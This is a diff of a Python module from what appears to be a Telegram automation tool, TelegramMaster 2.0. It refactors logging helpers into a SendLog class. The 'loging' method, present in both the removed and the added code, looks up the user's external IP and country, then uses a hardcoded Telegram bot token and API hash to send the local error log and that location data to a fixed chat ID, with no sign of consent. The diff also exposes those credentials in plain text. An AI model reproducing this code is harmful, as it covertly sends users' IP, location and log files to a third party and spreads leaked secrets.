@@ -3,90 +3,72 @@ import datetime
 import json
 from urllib.request import urlopen  # Изменено с urllib2 на urllib.request
 
-import flet as ft
-import phonenumbers
+import flet as ft  # Импортируем библиотеку flet
 import requests
-from phonenumbers import carrier, geocoder
 from telethon import TelegramClient
 from telethon.errors import FilePartsInvalidError
 
-from src.core.configs import PROGRAM_VERSION, DATE_OF_PROGRAM_CHANGE, PROGRAM_NAME
-from src.gui.gui import log_and_display
+from src.core.configs import (DATE_OF_PROGRAM_CHANGE, PROGRAM_NAME,
+                              PROGRAM_VERSION)
+from src.gui.gui import AppLogger
 
 
-async def getting_phone_number_data_by_phone_number(phone_numbers, page: ft.Page):
-    """
-    Определение страны и оператора по номеру телефона
+class SendLog:
 
-    :param phone_numbers: Номер телефона
-    :param page: Страница
-    :return: None
-    """
-
-    # Пример номера телефона для анализа
-    number = phonenumbers.parse(f"+{phone_numbers}", None)
-
-    # Получение информации о стране и операторе на русском языке
-    country_name = geocoder.description_for_number(number, "ru")
-    operator_name = carrier.name_for_number(number, "ru")
-
-    # Вывод информации
-    await log_and_display(f"Номер: {phone_numbers}, Оператор: {operator_name}, Страна: {country_name}", page)
+    def __init__(self, page: ft.Page):
+        self.page = page
+        self.app_logger = AppLogger(page)
 
 
-def get_country_flag(ip_address):
-    """
-    Определение страны по ip адресу на основе сервиса https://ipwhois.io/ru/documentation.
-    Возвращает флаг и название страны.
-    :param ip_address: IP адрес
-    :return: флаг и название страны
-    """
-    try:
-        ipwhois = json.load(urlopen(f'https://ipwho.is/{ip_address}'))
-        return ipwhois['flag']['emoji'], ipwhois['country']
-    except KeyError:
-        return "🏳️", "🌍"
+    def get_country_flag(self, ip_address):
+        """
+        Определение страны по ip адресу на основе сервиса https://ipwhois.io/ru/documentation.
+        Возвращает флаг и название страны.
+        :param ip_address: IP адрес
+        :return: флаг и название страны
+        """
+        try:
+            ipwhois = json.load(urlopen(f'https://ipwho.is/{ip_address}'))
+            return ipwhois['flag']['emoji'], ipwhois['country']
+        except KeyError:
+            return "🏳️", "🌍"
 
 
-def get_external_ip():
-    """Получение внешнего ip адреса"""
-    try:
-        response = requests.get('https://httpbin.org/ip')
-        response.raise_for_status()
-        return response.json().get("origin")
-    except requests.RequestException as _:
-        return None
+    def get_external_ip(self):
+        """Получение внешнего ip адреса"""
+        try:
+            response = requests.get('https://httpbin.org/ip')
+            response.raise_for_status()
+            return response.json().get("origin")
+        except requests.RequestException as _:
+            return None
 
 
-async def loging(page: ft.Page):
-    """
-    Логирование TelegramMaster 2.0
-    """
-    local_ip = get_external_ip()
-    emoji, country = get_country_flag(local_ip)
-    bot_token = '8452256961:AAHwa8tRMoe1SGPuFtpIFGXvShBQcRoUyKU'
-    client = TelegramClient('src/features/auth/log',
-                            api_id=7655060,
-                            api_hash="cc1290cd733c1f1d407598e5a31be4a8")
-    await client.start(bot_token=bot_token)
-    # Красивое сообщение
-    message = (
-        f"🚀 **Launch Information**\n\n"
-
-        f"Program name: `{PROGRAM_NAME}`\n"
-        f"🌍 IP Address: `{local_ip}`\n"
-        f"📍 Location: {country} {emoji}\n"
-        f"🕒 Date: `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
-        f"🔧 Program Version: `{PROGRAM_VERSION}`\n"
-        f"📅 Date of Change: `{DATE_OF_PROGRAM_CHANGE}`"
-    )
-    try:
-        await client.send_file(535185511, 'user_data/log/log_ERROR.log', caption=message)
-        client.disconnect()
-    except FilePartsInvalidError as error:
-        await log_and_display(f"{error}", page)
-        client.disconnect()
-
-
-if __name__ == "__main__":
-    get_external_ip()
+    async def loging(self):
+        """
+        Логирование TelegramMaster 2.0
+        """
+        local_ip = self.get_external_ip()
+        emoji, country = self.get_country_flag(local_ip)
+        bot_token = '8452256961:AAHwa8tRMoe1SGPuFtpIFGXvShBQcRoUyKU'
+        client = TelegramClient('src/features/auth/log',
+                                api_id=7655060,
+                                api_hash="cc1290cd733c1f1d407598e5a31be4a8")
+        await client.start(bot_token=bot_token)
+        # Красивое сообщение
+        message = (
+            f"🚀 **Launch Information**\n\n"
+    
+            f"Program name: `{PROGRAM_NAME}`\n"
+            f"🌍 IP Address: `{local_ip}`\n"
+            f"📍 Location: {country} {emoji}\n"
+            f"🕒 Date: `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
+            f"🔧 Program Version: `{PROGRAM_VERSION}`\n"
+            f"📅 Date of Change: `{DATE_OF_PROGRAM_CHANGE}`"
+        )
+        try:
+            await client.send_file(535185511, 'user_data/log/log_ERROR.log', caption=message)
+            client.disconnect()
+        except FilePartsInvalidError as error:
+            await self.app_logger.log_and_display(f"{error}")
+            client.disconnect()
